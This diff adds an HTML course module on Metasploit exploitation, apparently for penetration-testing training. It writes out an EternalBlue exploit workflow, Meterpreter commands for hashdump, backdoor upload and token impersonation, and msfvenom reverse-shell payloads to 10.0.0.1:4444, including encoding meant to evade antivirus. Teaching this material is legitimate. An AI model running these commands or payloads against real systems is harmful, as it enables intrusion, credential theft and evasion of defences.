@@ -1,0 +1,321 @@
+
+<div class="max-w-4xl mx-auto p-6 bg-slate-900 text-slate-100">
+  <h1 class="text-3xl font-bold mb-6 text-slate-100">Module 13: System Exploitation and Metasploit</h1>
+  
+  <p class="text-slate-300 mb-6 text-lg leading-relaxed">
+    System exploitation is the process of taking advantage of vulnerabilities to gain unauthorized access to systems. This module covers the Metasploit Framework, manual exploitation techniques, and post-exploitation activities.
+  </p>
+
+  <div class="mb-8">
+    <img src="/images/metasploit-framework.jpg" alt="Metasploit Framework" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Metasploit provides a comprehensive platform for exploitation and post-exploitation activities</p>
+  </div>
+
+  <h2 class="text-2xl font-semibold text-slate-100 mb-4">Learning Objectives</h2>
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <ul class="text-slate-300 space-y-2">
+      <li>• Master the Metasploit Framework for systematic exploitation</li>
+      <li>• Learn manual exploitation techniques and exploit development</li>
+      <li>• Understand buffer overflow exploitation and memory corruption</li>
+      <li>• Practice payload generation and delivery mechanisms</li>
+      <li>• Implement post-exploitation techniques and persistence</li>
+      <li>• Develop custom exploits and auxiliary modules</li>
+    </ul>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 1: Metasploit Framework Architecture</h3>
+
+  <div class="mb-8">
+    <img src="/images/metasploit-architecture.jpg" alt="Metasploit Architecture" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Understanding Metasploit's modular architecture is essential for effective usage</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    The Metasploit Framework is a powerful penetration testing platform that provides a structured approach to exploitation with its modular architecture and extensive exploit database.
+  </p>
+
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">Framework Components</h4>
+    <div class="space-y-3">
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-blue-400 mb-1">Exploits</h5>
+        <p class="text-slate-300 text-sm">Code that takes advantage of vulnerabilities to gain access to systems</p>
+      </div>
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-green-400 mb-1">Payloads</h5>
+        <p class="text-slate-300 text-sm">Code executed on target systems after successful exploitation</p>
+      </div>
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-yellow-400 mb-1">Auxiliary Modules</h5>
+        <p class="text-slate-300 text-sm">Support modules for scanning, fuzzing, and information gathering</p>
+      </div>
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-purple-400 mb-1">Post Modules</h5>
+        <p class="text-slate-300 text-sm">Post-exploitation modules for system enumeration and persistence</p>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 2: Basic Metasploit Usage</h3>
+
+  <div class="mb-8">
+    <img src="/images/metasploit-console.jpg" alt="Metasploit Console" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">The msfconsole provides an interactive interface for exploitation activities</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Learning basic Metasploit commands and workflow is essential for effective exploitation. The framework provides multiple interfaces, with msfconsole being the most powerful.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-red-400 mb-2">Essential Commands</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">search type:exploit name:ms17</span> - Search for exploits</p>
+          <p><span class="text-cyan-400">use exploit/windows/smb/ms17_010_eternalblue</span> - Select exploit</p>
+          <p><span class="text-cyan-400">show options</span> - Display required parameters</p>
+          <p><span class="text-cyan-400">set RHOSTS 192.168.1.100</span> - Set target host</p>
+          <p><span class="text-cyan-400">set payload windows/x64/meterpreter/reverse_tcp</span> - Select payload</p>
+          <p><span class="text-cyan-400">set LHOST 192.168.1.10</span> - Set listener host</p>
+          <p><span class="text-cyan-400">exploit</span> - Launch the attack</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-orange-400 mb-2">Workspace Management</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">workspace -a pentest2024</span> - Create workspace</p>
+          <p><span class="text-cyan-400">workspace pentest2024</span> - Switch workspace</p>
+          <p><span class="text-cyan-400">db_nmap -sS -A 192.168.1.0/24</span> - Scan and store results</p>
+          <p><span class="text-cyan-400">hosts</span> - Display discovered hosts</p>
+          <p><span class="text-cyan-400">services</span> - Show discovered services</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 3: Payload Types and Generation</h3>
+
+  <div class="mb-8">
+    <img src="/images/payload-generation.jpg" alt="Payload Generation" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Different payload types serve various exploitation scenarios and objectives</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Understanding different payload types and their capabilities is crucial for selecting the appropriate post-exploitation tool for specific scenarios and target environments.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Staged vs. Non-Staged</h4>
+      <div class="space-y-2">
+        <div class="bg-slate-900 rounded p-2">
+          <strong class="text-green-400">Staged (/):</strong>
+          <span class="text-slate-300 text-sm ml-2">Small stager downloads larger payload</span>
+        </div>
+        <div class="bg-slate-900 rounded p-2">
+          <strong class="text-yellow-400">Non-Staged (_):</strong>
+          <span class="text-slate-300 text-sm ml-2">Complete payload in single package</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Connection Types</h4>
+      <div class="space-y-2">
+        <div class="bg-slate-900 rounded p-2">
+          <strong class="text-blue-400">Reverse:</strong>
+          <span class="text-slate-300 text-sm ml-2">Target connects back to attacker</span>
+        </div>
+        <div class="bg-slate-900 rounded p-2">
+          <strong class="text-purple-400">Bind:</strong>
+          <span class="text-slate-300 text-sm ml-2">Target listens for attacker connection</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 4: Meterpreter Advanced Usage</h3>
+
+  <div class="mb-8">
+    <img src="/images/meterpreter-session.jpg" alt="Meterpreter Session" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Meterpreter provides powerful post-exploitation capabilities and stealth features</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Meterpreter is Metasploit's advanced payload that provides a dynamic extensible platform for post-exploitation activities with features designed to avoid detection.
+  </p>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-green-400 mb-2">Core Commands</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">sysinfo</span> - System information</p>
+          <p><span class="text-cyan-400">getuid</span> - Current user context</p>
+          <p><span class="text-cyan-400">ps</span> - List running processes</p>
+          <p><span class="text-cyan-400">migrate 1234</span> - Migrate to process ID</p>
+          <p><span class="text-cyan-400">hashdump</span> - Extract password hashes</p>
+          <p><span class="text-cyan-400">screenshot</span> - Capture screen</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-blue-400 mb-2">File System Operations</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">pwd</span> - Current directory</p>
+          <p><span class="text-cyan-400">ls</span> - List files</p>
+          <p><span class="text-cyan-400">cd C:\\Users</span> - Change directory</p>
+          <p><span class="text-cyan-400">download file.txt</span> - Download file</p>
+          <p><span class="text-cyan-400">upload backdoor.exe C:\\temp\\</span> - Upload file</p>
+          <p><span class="text-cyan-400">search -f *.config</span> - Search for files</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-purple-400 mb-2">Privilege Escalation</h5>
+      <div class="bg-slate-900 rounded p-3">
+        <div class="font-mono text-sm text-slate-300 space-y-1">
+          <p><span class="text-cyan-400">getsystem</span> - Attempt system privileges</p>
+          <p><span class="text-cyan-400">run post/windows/gather/enum_logged_on_users</span> - Enumerate users</p>
+          <p><span class="text-cyan-400">use incognito</span> - Load incognito module</p>
+          <p><span class="text-cyan-400">list_tokens -u</span> - List available tokens</p>
+          <p><span class="text-cyan-400">impersonate_token DOMAIN\\Administrator</span> - Token impersonation</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 5: Manual Exploitation Techniques</h3>
+
+  <div class="mb-8">
+    <img src="/images/manual-exploitation.jpg" alt="Manual Exploitation" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Manual exploitation requires deep understanding of vulnerabilities and system internals</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Manual exploitation techniques provide deeper understanding of vulnerability mechanics and enable custom attack development when automated tools fall short.
+  </p>
+
+  <div class="bg-slate-800 border border-slate-700 rounded-lg p-6 mb-6">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">Buffer Overflow Exploitation</h4>
+    <div class="space-y-3">
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-red-400 mb-1">Vulnerability Identification</h5>
+        <ul class="text-slate-300 text-sm space-y-1">
+          <li>• Fuzzing input fields and parameters</li>
+          <li>• Static code analysis for unsafe functions</li>
+          <li>• Dynamic analysis with debugging tools</li>
+          <li>• Exception handling and crash analysis</li>
+        </ul>
+      </div>
+
+      <div class="bg-slate-900 rounded p-3">
+        <h5 class="font-semibold text-orange-400 mb-1">Exploit Development Process</h5>
+        <ol class="text-slate-300 text-sm space-y-1 list-decimal list-inside">
+          <li>Crash the application with excessive input</li>
+          <li>Control the instruction pointer (EIP/RIP)</li>
+          <li>Find space for shellcode placement</li>
+          <li>Identify bad characters and restrictions</li>
+          <li>Find reliable return address (JMP ESP)</li>
+          <li>Generate and test shellcode payload</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Chapter 6: Custom Payload Development</h3>
+
+  <div class="mb-8">
+    <img src="/images/custom-payloads.jpg" alt="Custom Payload Development" class="w-full h-64 object-cover rounded-lg mb-4">
+    <p class="text-slate-400 text-sm text-center">Custom payloads enable bypassing security controls and achieving specific objectives</p>
+  </div>
+
+  <p class="text-slate-300 mb-4">
+    Custom payload development allows penetration testers to create targeted tools that bypass specific security controls and achieve unique objectives not covered by standard payloads.
+  </p>
+
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Msfvenom Usage</h4>
+      <div class="space-y-2">
+        <div class="bg-slate-900 rounded p-2">
+          <code class="text-green-400 text-sm">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe</code>
+        </div>
+        <div class="bg-slate-900 rounded p-2">
+          <code class="text-green-400 text-sm">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell</code>
+        </div>
+        <div class="bg-slate-900 rounded p-2">
+          <code class="text-green-400 text-sm">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.jsp</code>
+        </div>
+      </div>
+    </div>
+
+    <div class="bg-slate-800 rounded-lg p-4">
+      <h4 class="text-lg font-semibold text-slate-100 mb-2">Encoding and Evasion</h4>
+      <div class="space-y-2">
+        <div class="bg-slate-900 rounded p-2">
+          <code class="text-green-400 text-sm">msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe</code>
+        </div>
+        <div class="bg-slate-900 rounded p-2">
+          <code class="text-green-400 text-sm">msfvenom -p windows/shell_reverse_tcp -x template.exe -k -f exe</code>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Practical Exercises</h3>
+
+  <div class="space-y-4 mb-6">
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 1: Metasploit Exploitation Workflow</h5>
+      <p class="text-slate-300 text-sm mb-2">Practice complete exploitation using Metasploit:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Set up vulnerable target systems (Metasploitable)</li>
+        <li>• Conduct reconnaissance and vulnerability identification</li>
+        <li>• Select and configure appropriate exploits</li>
+        <li>• Execute exploitation and establish sessions</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 2: Buffer Overflow Development</h5>
+      <p class="text-slate-300 text-sm mb-2">Develop a working buffer overflow exploit:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Analyze vulnerable application using debugger</li>
+        <li>• Identify overflow point and control EIP</li>
+        <li>• Find bad characters and JMP ESP address</li>
+        <li>• Create working exploit with shell payload</li>
+      </ul>
+    </div>
+
+    <div class="bg-slate-800 border border-slate-700 rounded-lg p-4">
+      <h5 class="font-semibold text-slate-100 mb-2">Exercise 3: Custom Payload Creation</h5>
+      <p class="text-slate-300 text-sm mb-2">Create custom payloads for specific scenarios:</p>
+      <ul class="text-slate-300 text-sm space-y-1">
+        <li>• Generate payloads for different platforms</li>
+        <li>• Implement encoding to bypass antivirus</li>
+        <li>• Test payload effectiveness and detection rates</li>
+        <li>• Document payload capabilities and limitations</li>
+      </ul>
+    </div>
+  </div>
+
+  <h3 class="text-xl font-semibold text-slate-100 mb-4">Key Takeaways</h3>
+  <p class="text-slate-300 mb-6">
+    System exploitation is a critical skill for penetration testers, requiring both technical knowledge and practical experience. This module covered the Metasploit Framework, manual exploitation techniques, and payload development. Understanding these concepts enables security professionals to identify, validate, and demonstrate the impact of system vulnerabilities. Always ensure proper authorization before conducting exploitation activities and follow responsible disclosure practices when discovering new vulnerabilities. The combination of automated tools and manual techniques provides the most comprehensive approach to exploitation testing.
+  </p>
+
+  <div class="bg-gradient-to-r from-slate-800 to-slate-700 rounded-lg p-6 border border-slate-600">
+    <h4 class="text-lg font-semibold text-slate-100 mb-3">⚡ Next: Post-Exploitation Techniques</h4>
+    <p class="text-slate-300">
+      Module 14 explores post-exploitation activities including privilege escalation, persistence mechanisms, and lateral movement techniques.
+    </p>
+  </div>
+</div>
